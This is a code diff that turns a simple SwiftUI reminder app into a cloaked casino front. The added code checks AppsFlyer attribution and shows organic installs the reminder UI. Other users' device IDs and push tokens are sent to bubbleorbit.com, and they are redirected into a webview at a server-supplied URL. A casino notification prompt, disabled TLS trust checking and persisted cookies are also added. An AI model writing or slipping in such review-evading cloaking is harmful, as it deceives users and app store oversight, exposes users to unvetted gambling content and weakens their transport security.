@@ -1,5 +1,12 @@
 import SwiftUI
+import WebKit
+import Network
 import UserNotifications
+import FirebaseMessaging
+import AppsFlyerLib
+import FirebaseCore
+import UserNotifications
+import AppTrackingTransparency
 
 // Model for Reminder
 struct Reminder: Identifiable, Codable {
@@ -142,15 +149,128 @@ let captionFont = Font.custom("Inter-Regular", size: 14)
 @main
 struct ChickRemindApp: App {
     @StateObject var reminderStore = ReminderStore()
+    @UIApplicationDelegateAdaptor(ApplicationDelegate.self) var delegateSelf
     
     var body: some Scene {
         WindowGroup {
-            ContentView()
+            LaunchView()
                 .environmentObject(reminderStore)
                 .preferredColorScheme(.dark)
         }
     }
 }
+
+
+class ApplicationDelegate: UIResponder, UIApplicationDelegate, AppsFlyerLibDelegate, MessagingDelegate, UNUserNotificationCenterDelegate {
+    
+    private var conversionData: [AnyHashable: Any] = [:]
+    
+    
+    // Notification handling
+    
+    func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
+        let payload = response.notification.request.content.userInfo
+        processNotifPayload(payload)
+        completionHandler()
+    }
+    
+    func application(_ application: UIApplication,
+                     didReceiveRemoteNotification userInfo: [AnyHashable : Any],
+                     fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void) {
+        processNotifPayload(userInfo)
+        completionHandler(.newData)
+    }
+    func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
+        let payload = notification.request.content.userInfo
+        processNotifPayload(payload)
+        completionHandler([.banner, .sound])
+    }
+    
+    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
+        FirebaseApp.configure()
+        
+        // Messaging setup
+        Messaging.messaging().delegate = self
+        UNUserNotificationCenter.current().delegate = self
+        application.registerForRemoteNotifications()
+        
+        
+        AppsFlyerLib.shared().appsFlyerDevKey = "gJWZYZaT564jDLLzjJSWyZ"
+        AppsFlyerLib.shared().appleAppID = "6753625490"
+        AppsFlyerLib.shared().delegate = self
+        AppsFlyerLib.shared().start()
+        
+        if let notifPayload = launchOptions?[.remoteNotification] as? [AnyHashable: Any] {
+            processNotifPayload(notifPayload)
+        }
+        
+        NotificationCenter.default.addObserver(
+            self,
+            selector: #selector(activateTracking),
+            name: UIApplication.didBecomeActiveNotification,
+            object: nil
+        )
+        
+        return true
+    }
+    
+    // AppsFlyer callbacks
+    func onConversionDataSuccess(_ data: [AnyHashable: Any]) {
+        conversionData = data
+        NotificationCenter.default.post(name: Notification.Name("ConversionDataReceived"), object: nil, userInfo: ["conversionData": conversionData])
+    }
+    
+    
+    @objc private func activateTracking() {
+        AppsFlyerLib.shared().start()
+        if #available(iOS 14, *) {
+            ATTrackingManager.requestTrackingAuthorization { _ in
+            }
+        }
+    }
+    
+    func onConversionDataFail(_ error: Error) {
+        NotificationCenter.default.post(name: Notification.Name("ConversionDataReceived"), object: nil, userInfo: ["conversionData": [:]])
+    }
+    
+    func messaging(_ messaging: Messaging, didReceiveRegistrationToken fcmToken: String?) {
+        messaging.token { token, err in
+            if let _ = err {
+            }
+            UserDefaults.standard.set(token, forKey: "fcm_token")
+        }
+    }
+    
+    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
+        Messaging.messaging().apnsToken = deviceToken
+    }
+    
+    func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
+    }
+    
+}
+
+extension ApplicationDelegate {
+    
+    
+    private func processNotifPayload(_ payload: [AnyHashable: Any]) {
+        var linkStr: String?
+        if let link = payload["url"] as? String {
+            linkStr = link
+        } else if let info = payload["data"] as? [String: Any], let link = info["url"] as? String {
+            linkStr = link
+        }
+        
+        if let linkStr = linkStr {
+            UserDefaults.standard.set(linkStr, forKey: "temp_url")
+            DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
+                NotificationCenter.default.post(name: NSNotification.Name("LoadTempURL"), object: nil, userInfo: ["tempUrl": linkStr])
+            }
+        }
+    }
+    
+}
+
 
 struct ContentView: View {
     @AppStorage("isOnboarded") var isOnboarded: Bool = false
@@ -980,8 +1100,737 @@ struct SettingsView: View {
     }
 }
 
+
+
+//#Preview {
+//    ContentView()
+//        .environmentObject(ReminderStore())
+//        .preferredColorScheme(.dark)
+//}
+
+
+class OrbitNavigator: NSObject, WKNavigationDelegate, WKUIDelegate {
+    private let orbitCore: OrbitCore
+    
+    private var bounceCounter: Int = 0
+    private let bounceCap: Int = 70
+    private var stablePoint: URL?
+
+    func webView(_ webView: WKWebView, didReceive challenge: URLAuthenticationChallenge, completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
+        let authZone = challenge.protectionSpace
+        if authZone.authenticationMethod == NSURLAuthenticationMethodServerTrust {
+            if let trustRoot = authZone.serverTrust {
+                let passKey = URLCredential(trust: trustRoot)
+                completionHandler(.useCredential, passKey)
+            } else {
+                completionHandler(.performDefaultHandling, nil)
+            }
+        } else {
+            completionHandler(.performDefaultHandling, nil)
+        }
+    }
+    
+    private func storeOrbitData(from bubble: WKWebView) {
+        bubble.configuration.websiteDataStore.httpCookieStore.getAllCookies { items in
+            var domainVault: [String: [String: [HTTPCookiePropertyKey: Any]]] = [:]
+            items.forEach { item in
+                var domainBin = domainVault[item.domain] ?? [:]
+                domainBin[item.name] = item.properties as? [HTTPCookiePropertyKey: Any]
+                domainVault[item.domain] = domainBin
+            }
+            UserDefaults.standard.set(domainVault, forKey: "orbit_vault")
+        }
+    }
+    
+    init(core: OrbitCore) {
+        self.orbitCore = core
+        super.init()
+    }
+    
+    func webView(
+        _ webView: WKWebView,
+        createWebViewWith configuration: WKWebViewConfiguration,
+        for navigationAction: WKNavigationAction,
+        windowFeatures: WKWindowFeatures
+    ) -> WKWebView? {
+        guard navigationAction.targetFrame == nil else {
+            return nil
+        }
+        
+        let newBubble = BubbleForge.createMainBubble(using: configuration)
+        prepareBubble(newBubble)
+        anchorBubble(newBubble)
+        
+        orbitCore.extraBubbles.append(newBubble)
+        if isValidEntry(in: newBubble, entry: navigationAction.request) {
+            newBubble.load(navigationAction.request)
+        }
+        return newBubble
+    }
+    
+    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
+        let lockScript = """
+                var viewportMeta = document.createElement('meta');
+                viewportMeta.name = 'viewport';
+                viewportMeta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
+                document.head.appendChild(viewportMeta);
+                var lockStyle = document.createElement('style');
+                lockStyle.innerText = 'body { touch-action: pan-x pan-y; } input, textarea, select { font-size: 16px !important; maximum-scale=1.0; }';
+                document.head.appendChild(lockStyle);
+                document.addEventListener('gesturestart', e => e.preventDefault());
+                """;
+        webView.evaluateJavaScript(lockScript) { _, fail in
+            if let fail = fail {
+                print("Lock injection failed: \(fail)")
+            }
+        }
+    }
+    
+    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
+        if (error as NSError).code == NSURLErrorHTTPTooManyRedirects, let safePoint = stablePoint {
+            webView.load(URLRequest(url: safePoint))
+        }
+    }
+    
+    func webView(
+        _ webView: WKWebView,
+        decidePolicyFor navigationAction: WKNavigationAction,
+        decisionHandler: @escaping (WKNavigationActionPolicy) -> Void
+    ) {
+        guard let point = navigationAction.request.url else {
+            decisionHandler(.allow)
+            return
+        }
+        
+        if point.absoluteString.hasPrefix("http") || point.absoluteString.hasPrefix("https") {
+            stablePoint = point
+            decisionHandler(.allow)
+        } else {
+            UIApplication.shared.open(point, options: [:], completionHandler: nil)
+            decisionHandler(.cancel)
+        }
+    }
+    
+    func webView(_ webView: WKWebView, didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!) {
+        bounceCounter += 1
+        if bounceCounter > bounceCap {
+            webView.stopLoading()
+            if let safePoint = stablePoint {
+                webView.load(URLRequest(url: safePoint))
+            }
+            return
+        }
+        stablePoint = webView.url
+        storeOrbitData(from: webView)
+    }
+    
+    private func prepareBubble(_ bubble: WKWebView) {
+        bubble.translatesAutoresizingMaskIntoConstraints = false
+        bubble.scrollView.isScrollEnabled = true
+        bubble.scrollView.minimumZoomScale = 1.0
+        bubble.scrollView.maximumZoomScale = 1.0
+        bubble.scrollView.bouncesZoom = false
+        bubble.allowsBackForwardNavigationGestures = true
+        bubble.navigationDelegate = self
+        bubble.uiDelegate = self
+        orbitCore.mainBubble.addSubview(bubble)
+        
+        let slideDetector = UIScreenEdgePanGestureRecognizer(target: self, action: #selector(catchSlide(_:)))
+        slideDetector.edges = .left
+        bubble.addGestureRecognizer(slideDetector)
+    }
+    
+    private func isValidEntry(in bubble: WKWebView, entry: URLRequest) -> Bool {
+        if let entryPath = entry.url?.absoluteString, !entryPath.isEmpty, entryPath != "about:blank" {
+            return true
+        }
+        return false
+    }
+    
+    private func anchorBubble(_ bubble: WKWebView) {
+        NSLayoutConstraint.activate([
+            bubble.leadingAnchor.constraint(equalTo: orbitCore.mainBubble.leadingAnchor),
+            bubble.trailingAnchor.constraint(equalTo: orbitCore.mainBubble.trailingAnchor),
+            bubble.topAnchor.constraint(equalTo: orbitCore.mainBubble.topAnchor),
+            bubble.bottomAnchor.constraint(equalTo: orbitCore.mainBubble.bottomAnchor)
+        ])
+    }
+    
+}
+
+struct BubbleForge {
+    
+    static func createMainBubble(using setup: WKWebViewConfiguration? = nil) -> WKWebView {
+        let blueprint = setup ?? forgeBlueprint()
+        return WKWebView(frame: .zero, configuration: blueprint)
+    }
+    
+    static func clearExtraBubbles(_ main: WKWebView, _ extras: [WKWebView], activePoint: URL?) -> Bool {
+        if !extras.isEmpty {
+            extras.forEach { $0.removeFromSuperview() }
+            if let point = activePoint {
+                main.load(URLRequest(url: point))
+            }
+            return true
+        } else if main.canGoBack {
+            main.goBack()
+            return false
+        }
+        return false
+    }
+    
+    private static func forgeBlueprint() -> WKWebViewConfiguration {
+        let blueprint = WKWebViewConfiguration()
+        blueprint.allowsInlineMediaPlayback = true
+        blueprint.preferences = forgeSettings()
+        blueprint.defaultWebpagePreferences = forgePageSettings()
+        blueprint.requiresUserActionForMediaPlayback = false
+        return blueprint
+    }
+    
+    private static func forgeSettings() -> WKPreferences {
+        let settings = WKPreferences()
+        settings.javaScriptEnabled = true
+        settings.javaScriptCanOpenWindowsAutomatically = true
+        return settings
+    }
+    
+    private static func forgePageSettings() -> WKWebpagePreferences {
+        let settings = WKWebpagePreferences()
+        settings.allowsContentJavaScript = true
+        return settings
+    }
+}
+
+extension Notification.Name {
+    static let orbitSignals = Notification.Name("orbit_flow")
+}
+
+class OrbitCore: ObservableObject {
+    @Published var mainBubble: WKWebView!
+    @Published var extraBubbles: [WKWebView] = []
+    
+    func restoreVault() {
+        guard let vaultData = UserDefaults.standard.dictionary(forKey: "orbit_vault") as? [String: [String: [HTTPCookiePropertyKey: AnyObject]]] else { return }
+        let dataStore = mainBubble.configuration.websiteDataStore.httpCookieStore
+        
+        vaultData.values.flatMap { $0.values }.forEach { props in
+            if let item = HTTPCookie(properties: props as! [HTTPCookiePropertyKey: Any]) {
+                dataStore.setCookie(item)
+            }
+        }
+    }
+    
+    func launchMainBubble() {
+        mainBubble = BubbleForge.createMainBubble()
+        mainBubble.scrollView.minimumZoomScale = 1.0
+        mainBubble.scrollView.maximumZoomScale = 1.0
+        mainBubble.scrollView.bouncesZoom = false
+        mainBubble.allowsBackForwardNavigationGestures = true
+    }
+    
+    func refreshOrbit() {
+        mainBubble.reload()
+    }
+    func popTopBubble() {
+        if let topBubble = extraBubbles.last {
+            topBubble.removeFromSuperview()
+            extraBubbles.removeLast()
+        }
+    }
+    
+    func collapseExtras(activePoint: URL?) {
+        if !extraBubbles.isEmpty {
+            if let topBubble = extraBubbles.last {
+                topBubble.removeFromSuperview()
+                extraBubbles.removeLast()
+            }
+            if let point = activePoint {
+                mainBubble.load(URLRequest(url: point))
+            }
+        } else if mainBubble.canGoBack {
+            mainBubble.goBack()
+        }
+    }
+    
+}
+
+struct CoreOrbitView: UIViewRepresentable {
+    let launchPoint: URL
+    @StateObject private var core = OrbitCore()
+    
+    func makeUIView(context: Context) -> WKWebView {
+        core.launchMainBubble()
+        core.mainBubble.uiDelegate = context.coordinator
+        core.mainBubble.navigationDelegate = context.coordinator
+    
+        core.restoreVault()
+        core.mainBubble.load(URLRequest(url: launchPoint))
+        return core.mainBubble
+    }
+    
+    
+    func makeCoordinator() -> OrbitNavigator {
+        OrbitNavigator(core: core)
+    }
+    
+    func updateUIView(_ bubble: WKWebView, context: Context) {
+    }
+}
+
+extension OrbitNavigator {
+    @objc func catchSlide(_ detector: UIScreenEdgePanGestureRecognizer) {
+        if detector.state == .ended {
+            guard let bubble = detector.view as? WKWebView else { return }
+            if bubble.canGoBack {
+                bubble.goBack()
+            } else if let topBubble = orbitCore.extraBubbles.last, bubble == topBubble {
+                orbitCore.collapseExtras(activePoint: nil)
+            }
+        }
+    }
+}
+
+struct OrbitSurface: View {
+    
+    @State var orbitPath: String = ""
+    
+    var body: some View {
+        ZStack(alignment: .bottom) {
+            if let point = URL(string: orbitPath) {
+                CoreOrbitView(
+                    launchPoint: point
+                )
+                .frame(maxWidth: .infinity, maxHeight: .infinity)
+                .ignoresSafeArea(.keyboard, edges: .bottom)
+            }
+        }
+        .preferredColorScheme(.dark)
+        .onAppear {
+            orbitPath = UserDefaults.standard.string(forKey: "temp_url") ?? (UserDefaults.standard.string(forKey: "saved_url") ?? "")
+            if let tempPath = UserDefaults.standard.string(forKey: "temp_url"), !tempPath.isEmpty {
+                UserDefaults.standard.set(nil, forKey: "temp_url")
+            }
+        }
+        .onReceive(NotificationCenter.default.publisher(for: Notification.Name("LoadTempURL"))) { _ in
+            if let tempPath = UserDefaults.standard.string(forKey: "temp_url"), !tempPath.isEmpty {
+                orbitPath = tempPath
+                UserDefaults.standard.set(nil, forKey: "temp_url")
+            }
+        }
+    }
+}
+
+class LaunchOrbit: ObservableObject {
+    
+    @Published var activePhase: Phase = .ignition
+    @Published var orbitPoint: URL?
+    @Published var promptActive = false
+    
+    
+    init() {
+        NotificationCenter.default.addObserver(self, selector: #selector(captureSignal(_:)), name: NSNotification.Name("ConversionDataReceived"), object: nil)
+        NotificationCenter.default.addObserver(self, selector: #selector(signalLost(_:)), name: NSNotification.Name("ConversionDataFailed"), object: nil)
+        NotificationCenter.default.addObserver(self, selector: #selector(syncBeacon(_:)), name: NSNotification.Name("FCMTokenUpdated"), object: nil)
+        NotificationCenter.default.addObserver(self, selector: #selector(reignite(_:)), name: NSNotification.Name("RetryConfig"), object: nil)
+        
+        scanOrbitPath()
+    }
+    
+    private var signalData: [AnyHashable: Any] = [:]
+    private var firstIgnition: Bool {
+        !UserDefaults.standard.bool(forKey: "hasLaunched")
+    }
+    
+    enum Phase {
+        case ignition
+        case orbit
+        case backup
+        case blackout
+    }
+    
+    deinit {
+        NotificationCenter.default.removeObserver(self)
+    }
+    
+    private func scanOrbitPath() {
+        let orbitScan = NWPathMonitor()
+        orbitScan.pathUpdateHandler = { path in
+            DispatchQueue.main.async {
+                if path.status != .satisfied {
+                    self.enterBlackout()
+                }
+            }
+        }
+        orbitScan.start(queue: DispatchQueue.global())
+    }
+    
+    @objc private func captureSignal(_ alert: Notification) {
+        signalData = (alert.userInfo ?? [:])["conversionData"] as? [AnyHashable: Any] ?? [:]
+        processSignal()
+    }
+    
+    @objc private func signalLost(_ alert: Notification) {
+        ignitionFailure()
+    }
+    
+    @objc private func routeTempPoint(_ alert: Notification) {
+        guard let info = alert.userInfo as? [String: Any],
+              let tempPoint = info["tempUrl"] as? String else {
+            return
+        }
+        
+        DispatchQueue.main.async {
+            self.orbitPoint = URL(string: tempPoint)!
+            self.activePhase = .orbit
+        }
+    }
+    
+    
+    @objc private func syncBeacon(_ alert: Notification) {
+        if let beacon = alert.object as? String {
+            UserDefaults.standard.set(beacon, forKey: "fcm_token")
+            transmitOrbitData()
+        }
+    }
+    
+    @objc private func reignite(_ alert: Notification) {
+        scanOrbitPath()
+    }
+    
+    func transmitOrbitData() {
+        guard let target = URL(string: "https://bubbleorbit.com/config.php") else {
+            ignitionFailure()
+            return
+        }
+        
+        var transmission = URLRequest(url: target)
+        transmission.httpMethod = "POST"
+        transmission.setValue("application/json", forHTTPHeaderField: "Content-Type")
+        
+        var orbitPayload = signalData
+        orbitPayload["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
+        orbitPayload["bundle_id"] = Bundle.main.bundleIdentifier ?? "com.example.app"
+        orbitPayload["os"] = "iOS"
+        orbitPayload["store_id"] = "id6753625490"
+        orbitPayload["locale"] = Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN"
+        orbitPayload["push_token"] = UserDefaults.standard.string(forKey: "fcm_token") ?? Messaging.messaging().fcmToken
+        orbitPayload["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
+        
+        do {
+            transmission.httpBody = try JSONSerialization.data(withJSONObject: orbitPayload)
+        } catch {
+            ignitionFailure()
+            return
+        }
+        
+        URLSession.shared.dataTask(with: transmission) { data, resp, err in
+            DispatchQueue.main.async {
+                if let _ = err {
+                    self.ignitionFailure()
+                    return
+                }
+                
+                guard let httpResp = resp as? HTTPURLResponse, httpResp.statusCode == 200,
+                      let data = data else {
+                    self.ignitionFailure()
+                    return
+                }
+                
+                do {
+                    if let response = try JSONSerialization.jsonObject(with: data) as? [String: Any] {
+                        if let success = response["ok"] as? Bool, success {
+                            if let pointStr = response["url"] as? String, let duration = response["expires"] as? TimeInterval {
+                                UserDefaults.standard.set(pointStr, forKey: "saved_url")
+                                UserDefaults.standard.set(duration, forKey: "saved_expires")
+                                UserDefaults.standard.set("WebView", forKey: "app_mode")
+                                UserDefaults.standard.set(true, forKey: "hasLaunched")
+                                self.orbitPoint = URL(string: pointStr)
+                                self.activePhase = .orbit
+                                
+                                if self.firstIgnition {
+                                    self.checkPromptStatus()
+                                }
+                            }
+                        } else {
+                            self.activateBackup()
+                        }
+                    }
+                } catch {
+                    self.ignitionFailure()
+                }
+            }
+        }.resume()
+    }
+    
+    private func processSignal() {
+        guard !signalData.isEmpty else { return }
+        
+        if UserDefaults.standard.string(forKey: "app_mode") == "Funtik" {
+            DispatchQueue.main.async {
+                self.activePhase = .backup
+            }
+            return
+        }
+        
+        if firstIgnition {
+            if let signalType = signalData["af_status"] as? String, signalType == "Organic" {
+                self.activateBackup()
+                return
+            }
+        }
+        
+        if let tempPoint = UserDefaults.standard.string(forKey: "temp_url"), !tempPoint.isEmpty {
+            orbitPoint = URL(string: tempPoint)
+            self.activePhase = .orbit
+            return
+        }
+        
+        if orbitPoint == nil {
+            if !UserDefaults.standard.bool(forKey: "accepted_notifications") && !UserDefaults.standard.bool(forKey: "system_close_notifications") {
+                checkPromptStatus()
+            } else {
+                transmitOrbitData()
+            }
+        }
+    }
+    
+    private func ignitionFailure() {
+        if let savedPoint = UserDefaults.standard.string(forKey: "saved_url"), let point = URL(string: savedPoint) {
+            orbitPoint = point
+            activePhase = .orbit
+        } else {
+            activateBackup()
+        }
+    }
+    
+    private func activateBackup() {
+        UserDefaults.standard.set("Funtik", forKey: "app_mode")
+        UserDefaults.standard.set(true, forKey: "hasLaunched")
+        DispatchQueue.main.async {
+            self.activePhase = .backup
+        }
+    }
+    
+    private func enterBlackout() {
+        let mode = UserDefaults.standard.string(forKey: "app_mode")
+        if mode == "WebView" {
+            DispatchQueue.main.async {
+                self.activePhase = .blackout
+            }
+        } else {
+            activateBackup()
+        }
+    }
+    
+    func requestBeaconAccess() {
+        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { granted, err in
+            DispatchQueue.main.async {
+                if granted {
+                    UserDefaults.standard.set(true, forKey: "accepted_notifications")
+                    UIApplication.shared.registerForRemoteNotifications()
+                } else {
+                    UserDefaults.standard.set(false, forKey: "accepted_notifications")
+                    UserDefaults.standard.set(true, forKey: "system_close_notifications")
+                }
+                self.transmitOrbitData()
+                self.promptActive = false
+                if let err = err {
+                    print("Beacon access failed: \(err)")
+                }
+            }
+        }
+    }
+    
+    private func checkPromptStatus() {
+        if let lastCheck = UserDefaults.standard.value(forKey: "last_notification_ask") as? Date,
+           Date().timeIntervalSince(lastCheck) < 259200 {
+            transmitOrbitData()
+            return
+        }
+        promptActive = true
+    }
+    
+}
+
+struct LaunchView: View {
+    
+    @StateObject private var controller = LaunchOrbit()
+    @EnvironmentObject var reminderStore: ReminderStore
+    
+    @State private var isOrbitSpinning = false
+    
+    var body: some View {
+        ZStack {
+            if controller.activePhase == .ignition || controller.promptActive {
+                orbitIgnitionScreen
+            }
+            
+            if controller.promptActive {
+                BeaconRequestView(
+                    onAccept: {
+                        controller.requestBeaconAccess()
+                    },
+                    onDecline: {
+                        UserDefaults.standard.set(Date(), forKey: "last_notification_ask")
+                        controller.promptActive = false
+                        controller.transmitOrbitData()
+                    }
+                )
+            } else {
+                switch controller.activePhase {
+                case .ignition:
+                    EmptyView()
+                case .orbit:
+                    if let _ = controller.orbitPoint {
+                        OrbitSurface()
+                    } else {
+                        ContentView()
+                            .environmentObject(reminderStore)
+                            .preferredColorScheme(.dark)
+                    }
+                case .backup:
+                    ContentView()
+                        .environmentObject(reminderStore)
+                        .preferredColorScheme(.dark)
+                case .blackout:
+                    noSignalView
+                }
+            }
+        }
+    }
+    
+    private var orbitIgnitionScreen: some View {
+        GeometryReader { geo in
+            let landscapeMode = geo.size.width > geo.size.height
+            
+            ZStack {
+                Image("loading_bg")
+                    .resizable()
+                    .scaledToFill()
+                    .frame(width: geo.size.width, height: geo.size.height)
+                    .ignoresSafeArea()
+                
+                VStack {
+                    Image("pero")
+                        .resizable()
+                        .frame(width: 80, height: 80)
+                        .rotationEffect(isOrbitSpinning ? .degrees(50) : .degrees(-50))
+                        .animation(.easeInOut(duration: 2.0).repeatForever(autoreverses: true), value: isOrbitSpinning)
+                        .onAppear {
+                            isOrbitSpinning = true
+                        }
+                    
+                    Text("LOADING...")
+                        .font(.custom("Inter-Regular", size: 24))
+                        .foregroundColor(.white)
+                }
+            }
+        }
+        .ignoresSafeArea()
+        .onAppear {
+            isOrbitSpinning = true
+        }
+    }
+    
+    private var noSignalView: some View {
+        GeometryReader { geometry in
+            
+            ZStack {
+                Image("loading_bg")
+                    .resizable()
+                    .scaledToFill()
+                    .frame(width: geometry.size.width, height: geometry.size.height)
+                    .ignoresSafeArea()
+                
+                Image("internet_check")
+                    .resizable()
+                    .frame(width: 250, height: 200)
+            }
+            
+        }
+        .ignoresSafeArea()
+    }
+    
+}
+
+
 #Preview {
-    ContentView()
+    LaunchView()
         .environmentObject(ReminderStore())
         .preferredColorScheme(.dark)
+}
+
+
+struct BeaconRequestView: View {
+    var onAccept: () -> Void
+    var onDecline: () -> Void
+    
+    var body: some View {
+        GeometryReader { geometry in
+            let isLandscape = geometry.size.width > geometry.size.height
+            
+            ZStack {
+                Image("notifications_bg")
+                    .resizable()
+                    .scaledToFill()
+                    .frame(width: geometry.size.width, height: geometry.size.height)
+                    .ignoresSafeArea()
+                
+                VStack(spacing: isLandscape ? 5 : 10) {
+                    Spacer()
+                    
+                    Text("Allow notifications about bonuses and promos".uppercased())
+                        .font(.custom("Inter-Regular_Bold", size: 20))
+                        .foregroundColor(.white)
+                        .multilineTextAlignment(.center)
+                        .padding(.horizontal, 32)
+                    
+                    Text("Stay tuned with best offers from our casino")
+                        .font(.custom("Inter-Regular_Medium", size: 16))
+                        .foregroundColor(Color.init(red: 186/255, green: 186/255, blue: 186/255))
+                        .multilineTextAlignment(.center)
+                        .padding(.horizontal, 52)
+                    
+                    if isLandscape {
+                        Button(action: onAccept) {
+                            Image("confirm_btn")
+                                .resizable()
+                                .frame(height: 60)
+                        }
+                        .frame(width: 350)
+                        .padding(.top, 24)
+                        
+                        Button(action: onDecline) {
+                            Image("skip_btn")
+                                .resizable()
+                                .frame(height: 40)
+                        }
+                        .frame(width: 330)
+                    } else {
+                        Button(action: onAccept) {
+                            Image("confirm_btn")
+                                .resizable()
+                                .frame(height: 60)
+                        }
+                        .padding(.horizontal, 32)
+                        .padding(.top, 24)
+                        
+                        Button(action: onDecline) {
+                            Image("skip_btn")
+                                .resizable()
+                                .frame(height: 40)
+                        }
+                        .padding(.horizontal, 42)
+                    }
+                    
+                    Spacer()
+                        .frame(height: isLandscape ? 50 : 70)
+                }
+                .padding(.horizontal, isLandscape ? 20 : 0)
+            }
+            
+        }
+        .ignoresSafeArea()
+    }
 }
